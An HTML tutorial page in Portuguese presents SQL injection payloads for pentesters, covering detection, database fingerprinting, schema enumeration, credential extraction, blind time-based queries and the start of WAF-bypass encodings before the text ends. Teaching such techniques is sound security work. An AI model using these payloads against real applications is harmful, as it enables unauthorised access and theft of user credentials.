<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guia Definitivo de SQL Injection para Pentesters</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <style>
        :root {
            --primary: #1a1a2e;
            --secondary: #16213e;
            --accent: #0f3460;
            --danger: #e94560;
            --warning: #ff9a3c;
            --success: #1fab89;
            --info: #3282b8;
            --dark: #0d0d0d;
            --light: #f5f5f5;
            --gray: #8a8a8a;
        }

        [data-theme="light"] {
            --primary: #f0f2f5;
            --secondary: #ffffff;
            --accent: #4a90e2;
            --danger: #e74c3c;
            --warning: #f39c12;
            --success: #27ae60;
            --info: #3498db;
            --dark: #2c3e50;
            --light: #2c3e50;
            --gray: #7f8c8d;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: var(--light);
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            min-height: 100vh;
            padding: 0;
            transition: all 0.3s ease;
        }
        
        ::-webkit-scrollbar {
            width: 10px;
        }
        ::-webkit-scrollbar-track {
            background: var(--primary);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--accent);
            border-radius: 5px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--info);
        }

        /* Top Controls */
        .top-controls {
            position: fixed;
            top: 15px;
            right: 15px;
            display: flex;
            gap: 10px;
            z-index: 1002;
        }

        .control-btn {
            width: 35px;
            height: 35px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: var(--light);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8rem;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }

        .control-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: scale(1.1);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 300px 1fr;
            min-height: 100vh;
        }

        /* Sidebar */
        .sidebar {
            background: rgba(10, 10, 20, 0.95);
            padding: 20px 0;
            box-shadow: 2px 0 15px rgba(0,0,0,0.5);
            height: 100vh;
            position: sticky;
            top: 0;
            overflow-y: auto;
            transition: all 0.3s ease;
        }

        [data-theme="light"] .sidebar {
            background: rgba(255, 255, 255, 0.95);
            box-shadow: 2px 0 15px rgba(0,0,0,0.1);
        }

        .logo {
            padding: 0 20px 20px;
            border-bottom: 1px solid var(--accent);
            margin-bottom: 20px;
        }

        .logo h1 {
            font-size: 1.6rem;
            color: var(--light);
            background: linear-gradient(90deg, var(--info), var(--success));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        [data-theme="light"] .logo h1 {
            color: var(--dark);
            -webkit-text-fill-color: unset;
        }

        .logo p {
            font-size: 0.9rem;
            color: var(--gray);
            margin-top: 5px;
        }

        .nav-section {
            margin-bottom: 25px;
        }

        .nav-title {
            padding: 0 20px 10px;
            font-size: 0.9rem;
            color: var(--info);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .nav-item {
            display: flex;
            align-items: center;
            padding: 12px 20px;
            color: var(--light);
            text-decoration: none;
            transition: all 0.3s;
            border-left: 3px solid transparent;
            cursor: pointer;
        }
        [data-theme="light"] .nav-item {
            color: var(--dark);
        }

        .nav-item:hover {
            background: rgba(255, 255, 255, 0.05);
            border-left-color: var(--info);
        }
        [data-theme="light"] .nav-item:hover {
            background: rgba(0, 0, 0, 0.05);
        }

        .nav-item.active {
            background: var(--accent);
            color: white;
            border-left-color: var(--success);
        }
        [data-theme="light"] .nav-item.active {
            color: white;
        }
        
        .nav-icon {
            margin-right: 10px;
            font-size: 1.1rem;
            width: 20px;
            text-align: center;
        }

        /* Menu Hamb√∫rguer */
        .hamburger {
            display: none;
            flex-direction: column;
            cursor: pointer;
            width: 30px;
            height: 21px;
            justify-content: space-between;
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1001;
            background: transparent;
            border: none;
        }

        .hamburger span {
            display: block;
            height: 3px;
            width: 100%;
            background-color: white;
            border-radius: 3px;
            transition: all 0.3s ease;
        }

        [data-theme="light"] .hamburger span {
            background-color: var(--dark);
        }

        .hamburger.active span:nth-child(1) {
            transform: translateY(9px) rotate(45deg);
        }

        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }

        .hamburger.active span:nth-child(3) {
            transform: translateY(-9px) rotate(-45deg);
        }

        /* Main Content */
        .main-content {
            background: var(--secondary);
            padding: 0;
            overflow-y: auto;
            height: 100vh;
            transition: all 0.3s ease;
        }
        [data-theme="light"] .main-content {
            background: var(--primary);
        }
        

        .content-section {
            padding: 30px;
            display: none;
        }

        .content-section.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .section-header {
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--accent);
        }

        .section-title {
            font-size: 2rem;
            color: var(--light);
            margin-bottom: 10px;
            background: linear-gradient(90deg, var(--info), var(--success));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        [data-theme="light"] .section-title {
            color: var(--dark);
            -webkit-text-fill-color: unset;
        }

        .section-description {
            color: var(--gray);
            font-size: 1.1rem;
        }

        /* Cards */
        .card-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }

        .card {
            background: rgba(30, 30, 46, 0.8);
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            border: 1px solid var(--accent);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        [data-theme="light"] .card {
            background: rgba(255, 255, 255, 0.9);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }

        [data-theme="light"] .card:hover {
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }

        .card-header {
            background: linear-gradient(to right, var(--accent), var(--info));
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .card-header h3 {
            font-size: 1.2rem;
            margin: 0;
        }

        .risk-badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 15px;
            font-size: 0.7rem;
            font-weight: bold;
        }

        .high { background: var(--danger); }
        .medium { background: var(--warning); color: black; }
        .low { background: var(--success); }

        .card-body {
            padding: 20px;
        }
        
        .card-body p, .card-body li {
            margin-bottom: 15px;
            color: #ccc;
        }
        
        [data-theme="light"] .card-body p, [data-theme="light"] .card-body li {
            color: #666;
        }

        /* Code Blocks */
        .code-block {
            background: #1e1e2e;
            color: #cdd6f4;
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Cascadia Code', 'Consolas', 'Monaco', monospace;
            font-size: 0.85rem;
            line-height: 1.5;
            cursor: pointer;
            position: relative;
            transition: background-color 0.3s;
            border-left: 4px solid var(--info);
        }

        [data-theme="light"] .code-block {
            background: #f8f9fa;
            color: #2c3e50;
            border-left: 4px solid var(--accent);
        }

        .code-block:hover {
            background: #252536;
        }

        [data-theme="light"] .code-block:hover {
            background: #e9ecef;
        }

        /* --- ALTERADO: L√≥gica do bot√£o de copiar --- */
        .code-block::before {
            content: "Clique para copiar";
            position: absolute;
            top: 10px;
            right: 55px;
            font-size: 0.75rem;
            color: var(--light);
            background: #0d0d0d;
            padding: 4px 10px;
            border-radius: 4px;
            white-space: nowrap;
            opacity: 0;
            visibility: hidden;
            transform: translateX(10px);
            transition: all 0.3s ease;
            z-index: 1;
        }
        [data-theme="light"] .code-block::before {
            background: #333;
            color: white;
        }
        
        .code-block::after {
            content: "üìã";
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 1rem;
            color: var(--gray);
            background: rgba(0,0,0,0.5);
            padding: 3px 8px;
            border-radius: 4px;
            opacity: 0.6;
            transition: all 0.3s ease;
        }

        [data-theme="light"] .code-block::after {
            background: rgba(0,0,0,0.1);
            color: var(--gray);
        }
        
        .code-block:hover::before {
            opacity: 1;
            visibility: visible;
            transform: translateX(0);
        }

        .code-block:hover::after {
            opacity: 1;
            transform: scale(1.1);
        }

        .code-comment { color: #6c7086; font-style: italic; }
        .code-keyword { color: #cba6f7; }
        .code-string { color: #f9e2af; }
        .code-function { color: #89dceb; }
        .code-number { color: #fab387; }
        .code-operator { color: #cdd6f4; }
        .code-mysql { color: #00758f; }
        .code-postgres { color: #336791; }
        .code-mssql { color: #a91b1b; }
        .code-oracle { color: #c74634; }

        [data-theme="light"] .code-comment { color: #6c757d; }
        [data-theme="light"] .code-keyword { color: #d63384; }
        [data-theme="light"] .code-string { color: #198754; }
        [data-theme="light"] .code-function { color: #0d6efd; }
        [data-theme="light"] .code-number { color: #fd7e14; }

        /* Database Badges */
        .db-badges {
            display: flex;
            gap: 5px;
            margin-top: 10px;
            flex-wrap: wrap;
        }

        .db-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.7rem;
            font-weight: bold;
        }

        .mysql { background: #00758f; color: white; }
        .postgres { background: #336791; color: white; }
        .mssql { background: #a91b1b; color: white; }
        .oracle { background: #c74634; color: white; }
        .mongo { background: #47a248; color: white; }

        /* Warning Box */
        .warning {
            background: linear-gradient(135deg, rgba(255, 154, 60, 0.2), rgba(255, 154, 60, 0.1));
            color: #ff9a3c;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 5px solid var(--warning);
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        .warning p { color: #ffc99c; }
        
        [data-theme="light"] .warning {
            background: linear-gradient(135deg, rgba(255, 154, 60, 0.1), rgba(255, 154, 60, 0.05));
        }
        [data-theme="light"] .warning p { color: #c0752d; }


        /* Tool Items */
        .tool-item {
            padding: 20px;
            margin: 15px 0;
            background: rgba(30, 30, 46, 0.8);
            border-radius: 8px;
            border-left: 4px solid var(--info);
        }

        [data-theme="light"] .tool-item {
            background: rgba(255, 255, 255, 0.9);
            border-left: 4px solid var(--accent);
        }

        .tool-name {
            font-weight: bold;
            color: var(--info);
            margin-bottom: 8px;
            font-size: 1.1rem;
        }

        .tool-desc {
            color: var(--gray);
            margin-bottom: 15px;
        }

        /* Tips */
        .tip-box {
            padding: 15px;
            margin: 10px 0;
            border-radius: 6px;
            border-left: 4px solid;
        }

        .detection-tip {
            background: rgba(50, 130, 184, 0.2);
            border-left-color: var(--info);
        }

        .protection-tip {
            background: rgba(31, 171, 137, 0.2);
            border-left-color: var(--success);
        }
        
        .protection-tip ul {
            padding-left: 20px;
        }

        [data-theme="light"] .detection-tip {
            background: rgba(52, 152, 219, 0.1);
        }

        [data-theme="light"] .protection-tip {
            background: rgba(39, 174, 96, 0.1);
        }
        
        .cheatsheet-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: rgba(30, 30, 46, 0.8);
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }
        [data-theme="light"] .cheatsheet-table {
             background: white;
        }
        .cheatsheet-table th {
            background: var(--accent);
            color: white;
            padding: 12px 15px;
            text-align: left;
        }
        .cheatsheet-table td {
            padding: 10px 15px;
            border-bottom: 1px solid var(--accent);
        }
        [data-theme="light"] .cheatsheet-table td {
            border-bottom: 1px solid #eee;
        }
        .cheatsheet-table tr:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        [data-theme="light"] .cheatsheet-table tr:hover {
            background: #f5f5f5;
        }

        /* Copied Message */
        .copied-message {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 12px 20px;
            border-radius: 5px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 1000;
        }

        footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px 30px;
            border-top: 1px solid var(--accent);
            color: var(--gray);
        }

        /* Responsive */
        @media (max-width: 1024px) {
            .container {
                grid-template-columns: 1fr;
            }
            
            .sidebar {
                height: 100vh;
                position: fixed;
                left: -100%;
                width: 300px;
                transition: left 0.3s ease;
                z-index: 1000;
            }
            
            .sidebar.active {
                left: 0;
            }
            
            .main-content {
                height: auto;
                padding-top: 70px;
            }
            
            .card-grid {
                grid-template-columns: 1fr;
            }
            
            .hamburger {
                display: flex;
            }

            .top-controls {
                top: 15px;
                right: 15px;
            }
        }

        @media (max-width: 768px) {
            .content-section {
                padding: 20px 15px;
            }
            
            .section-title {
                font-size: 1.5rem;
            }
            
            .code-block {
                font-size: 0.8rem;
                padding: 15px;
            }
        }

        /* PDF Export Styles */
        @media print {
            .top-controls,
            .hamburger,
            .sidebar,
            .copied-message {
                display: none !important;
            }
            
            .container {
                grid-template-columns: 1fr;
            }
            
            .main-content {
                height: auto;
                overflow: visible;
                padding-top: 0;
            }
            
            .content-section {
                display: block !important;
                page-break-after: always;
            }
            
            .card {
                break-inside: avoid;
            }
        }
    </style>
</head>
<body data-theme="dark">
    <!-- Top Controls -->
    <div class="top-controls">
        <button class="control-btn" id="themeToggle" title="Alternar tema" aria-label="Alternar tema de cores">
            <i class="fas fa-moon"></i>
        </button>
        <button class="control-btn" id="exportPdf" title="Exportar para PDF" aria-label="Exportar para PDF">
            <i class="fas fa-file-pdf"></i>
        </button>
    </div>

    <!-- Menu Hamb√∫rguer -->
    <button class="hamburger" aria-label="Abrir menu de navega√ß√£o" aria-controls="sidebar" aria-expanded="false">
        <span></span>
        <span></span>
        <span></span>
    </button>

    <div class="container">
        <!-- Sidebar Navigation -->
        <div class="sidebar" id="sidebar">
            <div class="logo">
                <h1>Guia SQLi PRO</h1>
                <p>T√©cnicas para Pentesters</p>
            </div>
            
            <div class="nav-section">
                <div class="nav-title">Fundamentos</div>
                <div class="nav-item active" data-section="introduction">
                    <span class="nav-icon">üìñ</span> Introdu√ß√£o
                </div>
                <div class="nav-item" data-section="detection">
                    <span class="nav-icon">üîç</span> Detec√ß√£o
                </div>
                <div class="nav-item" data-section="enumeration">
                    <span class="nav-icon">üìä</span> Enumera√ß√£o
                </div>
                <div class="nav-item" data-section="data-extraction">
                    <span class="nav-icon">üìÇ</span> Extra√ß√£o de Dados
                </div>
                 <div class="nav-item" data-section="blind">
                    <span class="nav-icon">üëÅÔ∏è</span> SQL Injection Cego
                </div>
            </div>
            
            <div class="nav-section">
                <div class="nav-title">T√©cnicas Avan√ßadas</div>
                <div class="nav-item" data-section="bypass">
                    <span class="nav-icon">üõ°Ô∏è</span> Bypass de WAF
                </div>
                <div class="nav-item" data-section="advanced-commands">
                    <span class="nav-icon">‚ö°</span> Comandos Avan√ßados
                </div>
                <div class="nav-item" data-section="bitwise">
                    <span class="nav-icon">üî¢</span> M√°scara de Bits
                </div>
                <div class="nav-item" data-section="json">
                    <span class="nav-icon">üìÑ</span> Inje√ß√£o JSON/Array
                </div>
                <div class="nav-item" data-section="timing">
                    <span class="nav-icon">‚è±Ô∏è</span> Timing Diferencial
                </div>
                <div class="nav-item" data-section="polyglot">
                    <span class="nav-icon">üé≠</span> Polyglot Payloads
                </div>
                <div class="nav-item" data-section="dns">
                    <span class="nav-icon">üåê</span> DNS Exfiltration
                </div>
                <div class="nav-item" data-section="regex">
                    <span class="nav-icon">üß©</span> Regex & Chained Queries
                </div>
                <div class="nav-item" data-section="context">
                    <span class="nav-icon">üïµÔ∏è</span> Context-Aware Bypass
                </div>
                <div class="nav-item" data-section="hpp">
                    <span class="nav-icon">üîó</span> HPP + SQLi
                </div>
                <div class="nav-item" data-section="window">
                    <span class="nav-icon">üìä</span> Window Functions
                </div>
                <div class="nav-item" data-section="ml">
                    <span class="nav-icon">üß†</span> ML Evasion
                </div>
                <div class="nav-item" data-section="ai">
                    <span class="nav-icon">ü§ñ</span> SQL Injection com IA
                </div>
                 <div class="nav-item" data-section="second-order">
                    <span class="nav-icon">üîÑ</span> Second Order SQLi
                </div>
                <div class="nav-item" data-section="nosql">
                    <span class="nav-icon">üçÉ</span> NoSQL Injection
                </div>
                <div class="nav-item" data-section="advanced-defense-vectors">
                    <span class="nav-icon">üß±</span> Vetores Adicionais
                </div>
            </div>
            
            <div class="nav-section">
                <div class="nav-title">Recursos</div>
                <div class="nav-item" data-section="tools">
                    <span class="nav-icon">üõ†Ô∏è</span> Ferramentas
                </div>
                 <div class="nav-item" data-section="comparison">
                    <span class="nav-icon">üìã</span> Cheatsheet Comparativo
                </div>
                <div class="nav-item" data-section="practice">
                    <span class="nav-icon">üèãÔ∏è</span> Ambientes de Pr√°tica
                </div>
                <div class="nav-item" data-section="defense">
                    <span class="nav-icon">üõ°Ô∏è</span> Estrat√©gias de Defesa
                </div>
            </div>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <!-- Se√ß√£o Introdu√ß√£o -->
            <div class="content-section active" id="introduction">
                <div class="section-header">
                    <h1 class="section-title">Guia Definitivo de SQL Injection</h1>
                    <p class="section-description">Comandos, t√©cnicas e metodologias para testes de penetra√ß√£o em aplica√ß√µes web</p>
                </div>
                
                <div class="warning">
                    <strong>O impacto de um ataque de SQL Injection pode ser severo e multifacetado, incluindo:</strong>
                    <p>Roubo de Dados Confidenciais, Perda da Integridade dos Dados, Nega√ß√£o de Acesso e Comprometimento Total do Sistema. Esta vulnerabilidade explora falhas na maneira como uma aplica√ß√£o web processa os dados fornecidos por um usu√°rio.</p>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <h3>O que √© SQL Injection?</h3>
                    </div>
                    <div class="card-body">
                        <p>SQL Injection √© uma vulnerabilidade de seguran√ßa que permite a um invasor interferir nas consultas que um aplicativo faz ao seu banco de dados. Geralmente, permite a um invasor visualizar dados que normalmente n√£o s√£o recuper√°veis, incluindo dados pertencentes a outros usu√°rios ou quaisquer outros dados que o pr√≥prio aplicativo possa acessar.</p>
                        <p>Em muitos casos, um invasor pode modificar ou excluir esses dados, causando altera√ß√µes persistentes no conte√∫do ou comportamento do aplicativo. Em algumas situa√ß√µes, um invasor pode escalar um ataque de SQL Injection para comprometer o servidor subjacente ou outra infraestrutura de back-end, ou realizar um ataque de nega√ß√£o de servi√ßo.</p>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Detec√ß√£o -->
            <div class="content-section" id="detection">
                <div class="section-header">
                    <h1 class="section-title">Detec√ß√£o de Vulnerabilidades</h1>
                    <p class="section-description">Comandos para identificar se um par√¢metro √© vulner√°vel a SQLi</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Testes B√°sicos</h3>
                            <span class="risk-badge medium">RISCO M√âDIO</span>
                        </div>
                        <div class="card-body">
                            <p>Comandos simples para verificar vulnerabilidades:</p>
                            <div class="code-block">
<span class="code-comment">-- Teste com aspas simples</span>
<span class="code-string">'</span> <span class="code-keyword">OR</span> <span class="code-keyword">1</span>=<span class="code-keyword">1</span> <span class="code-comment">--</span>
<span class="code-string">'</span> <span class="code-keyword">OR</span> <span class="code-string">'a'</span>=<span class="code-string">'a'</span>
<span class="code-string">'</span> <span class="code-keyword">UNION SELECT</span> <span class="code-keyword">1,2,3</span> <span class="code-comment">--</span>

<span class="code-comment">-- Teste com operadores l√≥gicos</span>
<span class="code-string">'</span> <span class="code-keyword">AND</span> <span class="code-keyword">1</span>=<span class="code-keyword">1</span> <span class="code-comment">--</span> <span class="code-comment">(Comportamento normal)</span>
<span class="code-string">'</span> <span class="code-keyword">AND</span> <span class="code-keyword">1</span>=<span class="code-keyword">2</span> <span class="code-comment">--</span> <span class="code-comment">(Retorna vazio se vulner√°vel)</span>
                            </div>
                            <p><strong>Nota:</strong> <code>--</code> ou <code>#</code> comentam o restante da query em muitos bancos.</p>
                        </div>
                    </div>
                     <div class="card">
                        <div class="card-header">
                            <h3>Identifica√ß√£o do Banco de Dados</h3>
                        </div>
                        <div class="card-body">
                             <p>Comandos para identificar qual SGBD est√° em uso:</p>
                            <div class="code-block">
<span class="code-comment">-- MySQL</span>
' <span class="code-operator">UNION SELECT</span> <span class="code-function">@@version</span><span class="code-operator">,</span><span class="code-number">2</span> <span class="code-comment">--</span>

<span class="code-comment">-- PostgreSQL</span>
' <span class="code-operator">UNION SELECT</span> <span class="code-function">version</span>()<span class="code-operator">,</span><span class="code-number">2</span> <span class="code-comment">--</span>

<span class="code-comment">-- SQL Server</span>
' <span class="code-operator">UNION SELECT</span> <span class="code-function">@@version</span><span class="code-operator">,</span><span class="code-number">2</span> <span class="code-comment">--</span>

<span class="code-comment">-- Oracle</span>
' <span class="code-operator">UNION SELECT</span> <span class="code-function">banner</span><span class="code-operator">,</span><span class="code-number">2</span> <span class="code-operator">FROM</span> v<span class="code-operator">$</span>version <span class="code-comment">--</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Enumera√ß√£o -->
            <div class="content-section" id="enumeration">
                <div class="section-header">
                    <h1 class="section-title">Enumera√ß√£o de Estrutura</h1>
                    <p class="section-description">Comandos para extrair metadados do banco de dados</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Enumera√ß√£o de Banco</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Comandos para identificar e enumerar estruturas do banco:</p>
                            <div class="code-block">
<span class="code-comment">-- Listar tabelas (MySQL/PostgreSQL)</span>
<span class="code-string">'</span> <span class="code-keyword">UNION SELECT</span> table_name,<span class="code-keyword">2,3</span> <span class="code-keyword">FROM</span> information_schema.tables <span class="code-comment">--</span>

<span class="code-comment">-- Listar colunas de uma tabela (MySQL/PostgreSQL)</span>
<span class="code-string">'</span> <span class="code-keyword">UNION SELECT</span> column_name,<span class="code-keyword">2,3</span> <span class="code-keyword">FROM</span> information_schema.columns <span class="code-keyword">WHERE</span> table_name=<span class="code-string">'usuarios'</span> <span class="code-comment">--</span>

<span class="code-comment">-- Listar bancos de dados (MySQL)</span>
<span class="code-string">'</span> <span class="code-operator">UNION SELECT</span> schema_name<span class="code-operator">,</span><span class="code-number">2</span> <span class="code-operator">FROM</span> information_schema<span class="code-operator">.</span>schemata <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge postgres">PostgreSQL</span>
                            </div>
                        </div>
                    </div>
                     <div class="card">
                        <div class="card-header">
                            <h3>Usu√°rios e Privil√©gios</h3>
                        </div>
                        <div class="card-body">
                            <p>Identificando usu√°rios e seus privil√©gios no banco:</p>
                            <div class="code-block">
<span class="code-comment">-- Usu√°rio atual (MySQL)</span>
' <span class="code-operator">UNION SELECT</span> <span class="code-function">user</span>()<span class="code-operator">,</span><span class="code-number">2</span> <span class="code-comment">--</span>

<span class="code-comment">-- Privil√©gios do usu√°rio (MySQL)</span>
' <span class="code-operator">UNION SELECT</span> grantee<span class="code-operator">,</span>privilege_type <span class="code-operator">FROM</span> information_schema<span class="code-operator">.</span>user_privileges <span class="code-comment">--</span>

<span class="code-comment">-- Usu√°rios do sistema (MySQL - requer privil√©gios)</span>
' <span class="code-operator">UNION SELECT</span> User<span class="code-operator">,</span>Password <span class="code-operator">FROM</span> mysql<span class="code-operator">.</span>user <span class="code-comment">--</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Se√ß√£o Extra√ß√£o de Dados -->
            <div class="content-section" id="data-extraction">
                <div class="section-header">
                    <h1 class="section-title">Extraindo Dados Sens√≠veis</h1>
                    <p class="section-description">Comandos para roubar dados ap√≥s mapear a estrutura</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Extra√ß√£o de Dados</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                            <p>Comandos para extrair dados sens√≠veis:</p>
                            <div class="code-block">
<span class="code-comment">-- Extra√ß√£o simples (MySQL/PostgreSQL)</span>
<span class="code-string">'</span> <span class="code-keyword">UNION SELECT</span> usuario, senha, <span class="code-keyword">3</span> <span class="code-keyword">FROM</span> usuarios <span class="code-comment">--</span>

<span class="code-comment">-- Concatenando colunas (MySQL)</span>
' <span class="code-operator">UNION SELECT</span> <span class="code-function">CONCAT</span>(usuario,<span class="code-string">':'</span>,senha)<span class="code-operator">,</span><span class="code-number">2</span> <span class="code-operator">FROM</span> usuarios <span class="code-comment">--</span>

<span class="code-comment">-- Extra√ß√£o de m√∫ltiplas linhas (MySQL)</span>
' <span class="code-operator">UNION SELECT</span> <span class="code-function">GROUP_CONCAT</span>(usuario<span class="code-operator">,</span><span class="code-string">':'</span><span class="code-operator">,</span>senha)<span class="code-operator">,</span><span class="code-number">2</span> <span class="code-operator">FROM</span> usuarios <span class="code-comment">--</span>

<span class="code-comment">-- Extra√ß√£o com LIMIT</span>
' <span class="code-operator">UNION SELECT</span> usuario<span class="code-operator">,</span>senha <span class="code-operator">FROM</span> usuarios <span class="code-operator">LIMIT</span> <span class="code-number">0</span><span class="code-operator">,</span><span class="code-number">1</span> <span class="code-comment">--</span>
                            </div>
                            <div class="db-badges">
                                <span class="db-badge mysql">MySQL</span>
                                <span class="db-badge postgres">PostgreSQL</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Se√ß√£o SQL Injection Cego -->
            <div class="content-section" id="blind">
                <div class="section-header">
                    <h1 class="section-title">SQL Injection Cego (Blind)</h1>
                    <p class="section-description">T√©cnicas para quando erros n√£o s√£o exibidos diretamente</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Boolean-Based Blind</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                             <p>Explorando baseado em respostas verdadeiro/falso:</p>
                            <div class="code-block">
<span class="code-comment">-- Verificar comprimento da senha</span>
' <span class="code-operator">AND</span> (<span class="code-operator">SELECT</span> <span class="code-function">LENGTH</span>(password) <span class="code-operator">FROM</span> users <span class="code-operator">WHERE</span> username<span class="code-operator">=</span><span class="code-string">'admin'</span>)<span class="code-operator">=</span><span class="code-number">32</span> <span class="code-comment">--</span>

<span class="code-comment">-- Extrair caractere por caractere</span>
' <span class="code-operator">AND</span> (<span class="code-operator">SELECT</span> <span class="code-function">SUBSTRING</span>(password<span class="code-operator">,</span><span class="code-number">1</span><span class="code-operator">,</span><span class="code-number">1</span>) <span class="code-operator">FROM</span> users <span class="code-operator">WHERE</span> username<span class="code-operator">=</span><span class="code-string">'admin'</span>)<span class="code-operator">=</span><span class="code-string">'a'</span> <span class="code-comment">--</span>
                            </div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-header">
                            <h3>Time-Based Blind</h3>
                            <span class="risk-badge high">ALTO RISCO</span>
                        </div>
                        <div class="card-body">
                             <p>Explorando baseado em atrasos de tempo:</p>
                            <div class="code-block">
<span class="code-comment">-- MySQL:</span>
<span class="code-string">'</span> <span class="code-keyword">AND IF</span>(<span class="code-function">SUBSTRING</span>((<span class="code-keyword">SELECT</span> password <span class="code-keyword">FROM</span> users <span class="code-keyword">LIMIT</span> <span class="code-keyword">1</span>),<span class="code-keyword">1,1</span>)=<span class="code-string">'a'</span>, <span class="code-function">SLEEP</span>(5), <span class="code-number">0</span>) <span class="code-comment">--</span>

<span class="code-comment">-- PostgreSQL:</span>
<span class="code-string">'</span> <span class="code-keyword">AND CASE WHEN</span> (<span class="code-function">SUBSTRING</span>((<span class="code-keyword">SELECT</span> password <span class="code-keyword">FROM</span> users <span class="code-keyword">LIMIT</span> <span class="code-keyword">1</span>),<span class="code-keyword">1,1</span>)=<span class="code-string">'a'</span>) <span class="code-keyword">THEN</span> <span class="code-function">pg_sleep</span>(5) <span class="code-keyword">ELSE</span> <span class="code-keyword">NULL END</span> <span class="code-comment">--</span>
                                
<span class="code-comment">-- SQL Server:</span>
<span class="code-string">'</span> <span class="code-keyword">; IF</span> (<span class="code-function">SUBSTRING</span>((<span class="code-keyword">SELECT</span> password <span class="code-keyword">FROM</span> users),<span class="code-keyword">1,1</span>)=<span class="code-string">'a'</span>) <span class="code-function">WAITFOR DELAY</span> <span class="code-string">'00:00:05'</span> <span class="code-comment">--</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Se√ß√£o Bypass -->
            <div class="content-section" id="bypass">
                <div class="section-header">
                    <h1 class="section-title">Bypass de Prote√ß√µes (WAF)</h1>
                    <p class="section-description">T√©cnicas para evitar Web Application Firewalls</p>
                </div>
                
                <div class="card-grid">
                    <div class="card">
                        <div class="card-header">
                            <h3>Bypass de WAF</h3>
                            <span class="risk-badge medium">RISCO M√âDIO</span>
                        </div>
                        <div class="card-body">
                            <p>T√©cnicas para contornar firewalls de aplica√ß√£o web:</p>
                            <div class="code-block">
<span class="code-comment">-- URL Encoding</span>
%27%20OR%201%3D1%20--%20

<span class="code-comment">-- Caracteres alternativos e coment√°rios</span>
<span class="code-string">'</span> <span class="code-keyword">OR</span> <span class="code-keyword">1</span>=<span class="code-keyword">1</span> <span class="code-comment">/*! --*/</span>
<span class="code-string">'</span> <span class="code-keyword">OR</span> <span class="code-keyword">1</span>=<span class="code-keyword">1</span>;%00

<span class="code-comment">-- Usando coment√°rios internos</span>
